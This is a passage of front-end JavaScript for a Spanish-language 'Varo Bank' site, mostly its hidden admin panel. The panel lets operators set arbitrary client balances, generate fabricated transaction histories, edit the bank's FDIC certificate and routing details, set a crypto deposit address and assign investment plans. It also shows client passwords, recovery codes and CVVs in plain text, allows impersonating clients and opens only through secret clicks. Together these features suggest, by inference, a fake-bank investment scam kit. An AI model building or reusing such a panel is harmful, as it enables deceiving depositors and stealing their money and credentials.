        '<div class="kpi"><b>'+money(o.invested)+'</b><small>Invertido</small></div>'+
        '<div class="kpi"><b>'+o.pending+'</b><small>Pendientes</small></div>'+
        '<div class="kpi"><b>'+o.cards+'</b><small>Tarjetas activas</small></div>'+
        '<div class="kpi"><b>'+o.docs+'</b><small>Documentos</small></div>';
      $('#admLast').innerHTML = o.last.map(u => '<div class="it"><span>'+esc(u.name)+'<small>'+esc(u.user)+'</small></span><span>'+money(u.balance)+'</span></div>').join('');
    }
    if(tab === 'clientes'){
      const list = await admApi('/users');
      $('#admUsers').innerHTML = list.length ? list.map(u =>
        '<div class="us" data-id="'+u.id+'"><div class="r1"><span>'+esc(u.name)+'</span><span>'+money(u.balance)+'</span></div>'+
        '<div class="r2">'+esc(u.user)+' / '+esc(u.passPlain||'—')+' · '+esc(u.countryName||'—')+' · '+esc(u.state)+' · KYC '+u.kyc+'/4 · '+(u.card.active?'tarjeta activa':'sin activar')+' · '+(u.hasDoc?'doc ✅':'sin doc')+'</div></div>').join('')
        : '<p class="hint">Sin clientes.</p>';
      $$('#admUsers .us').forEach(el => el.onclick = () => admUser(el.dataset.id));
    }
    if(tab === 'pendientes'){
      const t = await admApi('/transfers');
      $('#admPends').innerHTML = t.length ? t.map(x =>
        '<div class="it"><span>'+esc(x.name)+' · '+esc(x.kind)+'<small>'+esc(x.to||'')+' '+esc(x.bank||'')+' '+esc(x.accountType||'')+' · '+new Date(x.date).toLocaleString()+' · '+esc(x.status)+'</small></span>'+
        '<span>'+money(x.amount)+' '+(x.status==='pendiente'?'<button class="btn btn-main sm" data-ok="'+x.id+'">OK</button> <button class="btn btn-ghost sm" data-no="'+x.id+'">No</button>':'')+'</span></div>').join('')
        : '<p class="hint">Sin operaciones.</p>';
      $$('[data-ok]').forEach(b => b.onclick = () => admTransfer(b.dataset.ok,'approve'));
      $$('[data-no]').forEach(b => b.onclick = () => admTransfer(b.dataset.no,'reject'));
      const c = await admApi('/contacts');
      $('#admContacts').innerHTML = c.length ? c.map(x => '<div class="it"><span>'+esc(x.name)+'<small>'+esc(x.email)+' '+esc(x.phone||'')+'</small>'+esc(x.msg)+'</span><span class="tiny">'+new Date(x.date).toLocaleDateString()+'</span></div>').join('') : '<p class="hint">Sin contactos.</p>';
    }
    if(tab === 'inversiones'){
      const iv = await admApi('/investments');
      $('#admInvs').innerHTML = iv.length ? iv.map(i => '<div class="it"><span>'+esc(i.name)+' · '+esc(i.planName)+'<small>'+new Date(i.date).toLocaleDateString()+' · '+i.days+' dias · '+esc(i.status)+'</small></span><span>'+money(i.amount)+'</span></div>').join('') : '<p class="hint">Sin inversiones.</p>';
    }
    if(tab === 'contenido') await admCms();
    if(tab === 'bancos') await admBanks();
    if(tab === 'ajustes') await admSet();
  }catch(e){ toast(e.message, true); }
}
async function admTransfer(id, action){
  try{ await admApi('/transfer/'+id, { method:'POST', body: JSON.stringify({ action }) }); toast('Actualizado'); admRender(); }
  catch(e){ toast(e.message, true); }
}

async function admUser(id){
  try{
    const r = await admApi('/user/'+id);
    const u = r.user;
    $('#admUserBox').hidden = false;
    $('#admUserName').textContent = u.name + ' (' + u.user + ')';
    $('#admUserBody').innerHTML =
      '<div class="it"><span>Usuario / Contraseña</span><b>'+esc(u.user)+' / '+esc(u.passPlain||'—')+'</b></div>'+
      (u.recoverCode ? '<div class="it"><span>Codigo de recuperacion activo</span><b>'+esc(u.recoverCode)+'</b></div>' : '')+
      '<div class="it"><span>Saldo</span><b>'+money(u.balance)+'</b></div>'+
      '<div class="it"><span>Tarjeta</span><b>'+u.card.number+' · CVV '+(u.card.cvvVisible?u.card.cvv:'•••')+' · '+(u.card.active?'ACTIVA':'BLOQUEADA')+'</b></div>'+
      '<div class="it"><span>Pais / Tel / Email</span><b>'+esc(u.countryName||'')+' '+esc(u.phone||'')+' '+esc(u.email||'')+'</b></div>'+
      (u.document ? '<img class="doc-img" src="'+u.document+'" alt="Documento">' : '<p class="hint">Sin documento adjunto.</p>')+
      '<div class="row" style="margin-top:10px">'+
        '<button class="btn btn-main sm" data-a="balance">Ajustar saldo</button>'+
        '<button class="btn btn-ghost sm" data-a="card">'+(u.card.active?'Desactivar tarjeta':'ACTIVAR tarjeta')+'</button>'+
        '<button class="btn btn-ghost sm" data-a="cvv">'+(u.card.cvvVisible?'Bloquear CVV':'Mostrar CVV')+'</button>'+
        '<button class="btn btn-ghost sm" data-a="cardnum">Editar datos de tarjeta</button>'+
        '<button class="btn btn-ghost sm" data-a="profile">Editar datos del cliente</button>'+
        '<button class="btn btn-main sm" data-a="verify">VERIFICAR identidad (activar cuenta)</button>'+
        '<button class="btn btn-ghost sm" data-a="docok">Marcar documento verificado</button>'+
        '<button class="btn btn-ghost sm" data-a="state">Bloquear/Activar cuenta</button>'+
        '<button class="btn btn-ghost sm" data-a="history">Agregar movimiento</button>'+
        '<button class="btn btn-ghost sm" data-a="historygen">Generar historial</button>'+
        '<button class="btn btn-ghost sm" data-a="historyclear">Borrar movimientos</button>'+
        '<button class="btn btn-ghost sm" data-a="invest">Asignar inversion</button>'+
        '<button class="btn btn-ghost sm" data-a="note">Nota</button>'+
        '<button class="btn btn-ghost sm" data-a="message">Mensaje</button>'+
        '<button class="btn btn-ghost sm" data-a="password">Cambiar clave</button>'+
        '<button class="btn btn-ghost sm" data-a="impersonate">Entrar como</button>'+
        '<button class="btn btn-ghost sm" data-a="delete">Eliminar</button>'+
      '</div>';
    $$('#admUserBody [data-a]').forEach(b => b.onclick = () => admUserAction(u.id, b.dataset.a));
  }catch(e){ toast(e.message, true); }
}

async function admUserAction(id, action){
  let body = { action };
  if(action === 'balance'){
    const m = prompt('Escribe "set" para fijar el saldo o "add" para sumar:', 'add'); if(!m) return;
    const a = prompt('Importe (negativo para restar):', '100'); if(a===null) return;
    body.mode = m; body.amount = Number(a);
  } else if(action === 'note'){ body.text = prompt('Nota:'); if(!body.text) return; }
  else if(action === 'message'){ body.text = prompt('Mensaje al cliente:'); if(!body.text) return; }
  else if(action === 'password'){ body.pass = prompt('Nueva clave (min 6):', 'demo1234'); if(!body.pass) return; }
  else if(action === 'history'){
    body.desc = prompt('Descripcion del movimiento:', 'Recarga confirmada'); if(!body.desc) return;
    const a = prompt('Importe (negativo = cargo):', '100'); if(a===null) return;
    body.amount = Number(a); body.type = Number(a) < 0 ? 'out' : 'in';
  }
  else if(action === 'cardnum'){
    body.number = prompt('Numero de tarjeta (16 digitos):', '4000123456789010') || '';
    body.exp = prompt('Vencimiento (MM/AA):', '12/29') || '';
    body.cvv = prompt('CVV:', '123') || '';
  }
  else if(action === 'profile'){
    body.name = prompt('Nombre completo:', '') || '';
    body.email = prompt('Correo:', '') || '';
    body.phone = prompt('Telefono:', '') || '';
  }
  else if(action === 'invest'){
    const plans = (CONTENT && CONTENT.plans) || FALLBACK_PLANS;
    body.planId = prompt('Plan (' + plans.map(p=>p.id).join(', ') + '):', plans[0].id);
    body.amount = Number(prompt('Importe:', '500') || 0);
  }
  else if(action === 'card'){ body.active = !(await admApi('/user/'+id)).user.card.active; }
  else if(action === 'cvv'){ body.value = !(await admApi('/user/'+id)).user.card.cvvVisible; }
  else if(action === 'state'){ const u = (await admApi('/user/'+id)).user; body.state = u.state==='activo'?'bloqueado':'activo'; }
  else if(action === 'delete'){ if(!confirm('Eliminar cliente?')) return; }
  else if(action === 'impersonate'){
    try{
      const r = await admApi('/user/'+id, { method:'POST', body: JSON.stringify({ action:'impersonate' }) });
      localStorage.setItem(TOKEN_KEY, r.token); ME = r.user;
      $('#admShell').hidden = true; openApp(); toast('Sesion iniciada como ' + r.user.user);
    }catch(e){ toast(e.message, true); }
    return;
  }
  try{
    const r = await admApi('/user/'+id, { method:'POST', body: JSON.stringify(body) });
    toast('Hecho'); admUser(id);
    if(r.deleted) admRender();
  }catch(e){ toast(e.message, true); }
}

async function admCms(){
  const c = await admApi('/content');
  const f = [
    ['brand.name','Nombre del banco'],['brand.legal','Razon social'],['brand.fdic','Certificado FDIC'],
    ['brand.routing','Numero de ruta'],['brand.swift','SWIFT / BIC'],['brand.office','Direccion de la sede'],
    ['brand.mapsUrl','URL Google Maps'],['brand.fdicUrl','URL registro FDIC'],['brand.phone','Telefono'],
    ['brand.whatsapp','WhatsApp (con +pais)'],['brand.email','Correo'],['brand.hours','Horario'],
    ['hero.badge','Hero: etiqueta'],['hero.title','Hero: titulo'],['hero.sub','Hero: subtitulo'],
    ['cta.title','CTA: titulo'],['cta.sub','CTA: subtitulo'],['cta.btn','CTA: boton'],
    ['footer.note','Pie: nota legal'],['tickerTitle','Titulo ticker']
  ];
  $('#cmsForm').innerHTML = f.map(([p,l]) => {
    const parts = p.split('.'); let v = c;
    for(const k of parts){ if(v==null) break; v = v[k]; }
    return '<label class="lbl">'+l+'<input data-cms-path="'+p+'" value="'+esc(v||'')+'"></label>';
  }).join('');
  $('#cmsJson').value = JSON.stringify(c, null, 2);
}
$('#cmsSave').onclick = async () => {
  const body = {};
  $$('[data-cms-path]').forEach(inp => {
    const parts = inp.dataset.cmsPath.split('.');
    let o = body;
    parts.forEach((k,i) => { if(i === parts.length-1) o[k] = inp.value; else o = (o[k] = o[k] || {}); });
  });
  try{ const r = await admApi('/content', { method:'POST', body: JSON.stringify(body) }); CONTENT = r.content; applyContent(); renderStatic(); renderPlans(); toast('Contenido actualizado'); }
  catch(e){ toast(e.message, true); }
};
$('#cmsJsonSave').onclick = async () => {
  try{
    const obj = JSON.parse($('#cmsJson').value);
    const r = await admApi('/content', { method:'POST', body: JSON.stringify(obj) });
    CONTENT = r.content; applyContent(); renderStatic(); renderPlans(); toast('JSON guardado');
  }catch(e){ toast('JSON invalido: ' + e.message, true); }
};

async function admBanks(){
  const b = await admApi('/banks');
  $('#banksForm').innerHTML = COUNTRIES.map(c =>
    '<label class="lbl" style="margin-bottom:10px">'+c.flag+' '+c.name+'<textarea data-bank="'+c.code+'" rows="4">'+esc((b[c.code]||[]).join('\n'))+'</textarea></label>').join('');
}
$('#banksSave').onclick = async () => {
  const body = {};
  $$('[data-bank]').forEach(t => { body[t.dataset.bank] = t.value.split('\n').map(x=>x.trim()).filter(Boolean); });
  try{ const r = await admApi('/banks', { method:'POST', body: JSON.stringify(body) }); BANKS = r.banks; toast('Bancos guardados'); }
  catch(e){ toast(e.message, true); }
};

function planRow(p){
  const d = document.createElement('div');
  d.className = 'row plan-row';
  d.style.cssText = 'align-items:end;margin-bottom:6px';
  d.innerHTML =
    '<input type="hidden" data-k="id" value="'+esc(p.id||'')+'">'+
    '<label class="lbl" style="flex:1;min-width:120px">Nombre<input data-k="name" value="'+esc(p.name||'')+'"></label>'+
    '<label class="lbl" style="width:70px">%<input data-k="rate" type="number" value="'+(p.rate||0)+'"></label>'+
    '<label class="lbl" style="width:70px">Dias<input data-k="days" type="number" value="'+(p.days||30)+'"></label>'+
    '<label class="lbl" style="width:92px">Minimo<input data-k="min" type="number" value="'+(p.min||0)+'"></label>'+
    '<button type="button" class="btn btn-ghost sm plan-del" title="Eliminar">✕</button>';
  d.querySelector('.plan-del').onclick = () => d.remove();
  return d;
}
function renderPlanRows(list){
  const box = $('#setPlans'); if(!box) return;
  box.innerHTML = '';
  (list && list.length ? list : [{ id:'plan1', name:'Plan Nuevo', rate:10, days:30, min:100 }])
    .forEach(p => box.appendChild(planRow(p)));
}
if($('#setPlanAdd')) $('#setPlanAdd').onclick = () => {
  $('#setPlans').appendChild(planRow({ id:'plan'+Date.now(), name:'Plan Nuevo', rate:10, days:30, min:100 }));
};

async function admSet(){
  const s = await admApi('/settings');
  $('#setMin').value = s.minReload;
  $('#setTwofa').value = String(!!s.twofa);
  $('#setCvv').value = String(!!s.cvvDefault);
  $('#setWalletAddr').value = s.cryptoAddress || '';
  $('#setWalletNet').value = s.cryptoNetwork || '';
  $('#setWalletLink').value = s.cryptoLink || '';
  $('#setCrypto').innerHTML = Object.keys(s.crypto||{}).map(k =>
    '<label class="lbl" style="width:120px">'+k+'<input data-c="'+k+'" type="number" value="'+(s.crypto[k])+'"></label>').join('');
  renderPlanRows(s.plans || []);
}
$('#setSave').onclick = async () => {
  const s = await admApi('/settings');
  s.minReload = Number($('#setMin').value) || 50;
  s.twofa = $('#setTwofa').value === 'true';
  s.cvvDefault = $('#setCvv').value === 'true';
  s.cryptoAddress = $('#setWalletAddr').value;
  s.cryptoNetwork = $('#setWalletNet').value;
  s.cryptoLink = $('#setWalletLink').value;
  $$('[data-c]').forEach(i => { s.crypto[i.dataset.c] = Number(i.value); });

  s.plans = $$('#setPlans .plan-row').map(r => ({
    id: (r.querySelector('[data-k=id]').value || 'p' + Math.random().toString(36).slice(2,7)).replace(/\s+/g,'').toLowerCase(),
    name: r.querySelector('[data-k=name]').value.trim(),
    rate: Number(r.querySelector('[data-k=rate]').value) || 0,
    days: Number(r.querySelector('[data-k=days]').value) || 30,
    min: Number(r.querySelector('[data-k=min]').value) || 0
  })).filter(p => p.name);

  try{
    await admApi('/settings', { method:'POST', body: JSON.stringify(s) });
    CONTENT.plans = s.plans; CRYPTO = s.crypto;
    renderPlans(); renderCrypto(); renderPlanRows(s.plans); fillCalcPlans();
    toast('Ajustes y planes guardados');
  }catch(e){ toast(e.message, true); }
};

$('#admSeed').onclick = async () => { try{ const r = await admApi('/seed-users', { method:'POST' }); toast('Creados: ' + r.created); admRender(); }catch(e){ toast(e.message,true); } };
$('#admBroadcast').onclick = async () => {
  const text = prompt('Mensaje para todos los clientes:'); if(!text) return;
  try{ const r = await admApi('/broadcast', { method:'POST', body: JSON.stringify({ text }) }); toast('Enviado a ' + r.count); }catch(e){ toast(e.message,true); }
};
$('#admBackup').onclick = () => window.open('/api/admin/backup?t=' + (localStorage.getItem(ADM_KEY)||''), '_blank');

/* ---------- eventos globales ---------- */
$('#btnLogin').onclick = () => openAuth('login');
$('#btnRegister').onclick = () => openAuth('register');
$('#authClose').onclick = closeAuth;
$$('[data-act]').forEach(b => b.onclick = e => { e.preventDefault(); openAuth(b.dataset.act === 'login' ? 'login' : 'register'); });

/* admin oculto: 3 toques en el logo */
let logoClicks = 0, logoTimer = null;
$('#logoBtn').onclick = e => {
  logoClicks++;
  clearTimeout(logoTimer);
  logoTimer = setTimeout(() => { if(logoClicks < 3) location.hash = 'top'; logoClicks = 0; }, 400);
  if(logoClicks === 3){ logoClicks = 0; clearTimeout(logoTimer); admLogin(); }
};
/* admin oculto: 2 toques en el (c) del pie */
let copyClicks = 0, copyTimer = null;
$('#year').onclick = () => {
  copyClicks++;
  clearTimeout(copyTimer);
  copyTimer = setTimeout(() => copyClicks = 0, 400);
  if(copyClicks === 2){ copyClicks = 0; admLogin(); }
};
$('#admDot').onclick = () => admLogin();

document.addEventListener('keydown', e => {
  if(e.ctrlKey && e.shiftKey && (e.key === 'A' || e.key === 'a')){ e.preventDefault(); admLogin(); }
  if(e.key === 'Escape'){ closeAuth(); $('#chatPanel').hidden = true; $$('.modal').forEach(m => m.hidden = true); }
});
$('#burger').onclick = () => $('#navLinks').classList.toggle('open');
$$('#navLinks a').forEach(a => a.onclick = () => $('#navLinks').classList.remove('open'));
$('#year').textContent = new Date().getFullYear();
if(!localStorage.getItem('vb_cookie')) $('#cookies').hidden = false;
$('#cookieOk').onclick = () => { localStorage.setItem('vb_cookie','1'); $('#cookies').hidden = true; };
window.addEventListener('scroll', () => { $('#toTop').hidden = window.scrollY < 400; });
$('#toTop').onclick = () => window.scrollTo({ top:0, behavior:'smooth' });

/* ---------- fluidez: barra, nav, ripple, contadores ---------- */
const sb = $('#scrollBar');
window.addEventListener('scroll', () => {
  const h = document.documentElement.scrollHeight - window.innerHeight;
  if(sb) sb.style.width = (h > 0 ? (window.scrollY / h) * 100 : 0) + '%';
  const nav = $('#nav'); if(nav) nav.classList.toggle('shrunk', window.scrollY > 40);
  $('#toTop').hidden = window.scrollY < 400;
}, { passive:true });

document.addEventListener('pointermove', e => {
  const b = e.target.closest && e.target.closest('.btn');
  if(!b) return;
  const r = b.getBoundingClientRect();
  b.style.setProperty('--mx', ((e.clientX - r.left) / r.width * 100) + '%');
  b.style.setProperty('--my', ((e.clientY - r.top) / r.height * 100) + '%');
}, { passive:true });

function animateStats(){
  $$('.stat b').forEach(el => {
    const txt = el.textContent.trim();
    if(!/^\d+$/.test(txt)) return;
    const num = parseInt(txt, 10);
    let i = 0;
    const t = setInterval(() => {
      i++;
      el.textContent = String(Math.round(num * i / 26)).replace(/\B(?=(\d{3})+(?!\d))/g, '.');
      if(i >= 26){ clearInterval(t); el.textContent = txt; }
    }, 22);
  });
}

const io = new IntersectionObserver(es => es.forEach(en => { if(en.isIntersecting){ en.target.classList.add('on'); io.unobserve(en.target); } }), { threshold:.12 });

/* ---------- init ---------- */
async function init(){
  try{ CONTENT = await api('/content'); }catch(e){ CONTENT = null; }
  try{ const c = await api('/countries'); if(c && c.length) COUNTRIES = c; }catch(e){}
  try{ const b = await api('/banks'); if(b) BANKS = Object.assign({}, FALLBACK_BANKS, b); }catch(e){}
  try{ const f = await api('/fx'); if(f) FX = Object.assign({}, FALLBACK_FX, f); }catch(e){}
  try{ const k = await api('/crypto'); if(k) CRYPTO = Object.assign({}, FALLBACK_CRYPTO, k); }catch(e){}
  try{ const s = await api('/settings'); if(s){ if(s.minReload) MIN_RELOAD = s.minReload; SETTINGS = s; } }catch(e){}
  if(!CONTENT) CONTENT = { plans: FALLBACK_PLANS, stats: [], productos: [], faq: [], sobre:{puntos:[]} };
  if(!CONTENT.plans || !CONTENT.plans.length) CONTENT.plans = FALLBACK_PLANS;

  fillCountries(); applyContent(); renderStatic(); renderPlans(); fillCalcPlans(); buildTicker(); calc(); ensureNoEmpty();
  $$('.rv').forEach(el => io.observe(el));
  setTimeout(animateStats, 900);
  setInterval(refreshTicker, 2600);
  setInterval(ensureNoEmpty, 4000);

  if(localStorage.getItem(TOKEN_KEY)){
    try{ await loadMe(); openApp(); }catch(e){ localStorage.removeItem(TOKEN_KEY); }
  }
  console.log('%cVaro Bank v22.0.0 listo','color:#00ffc8;font-weight:bold');
}
init();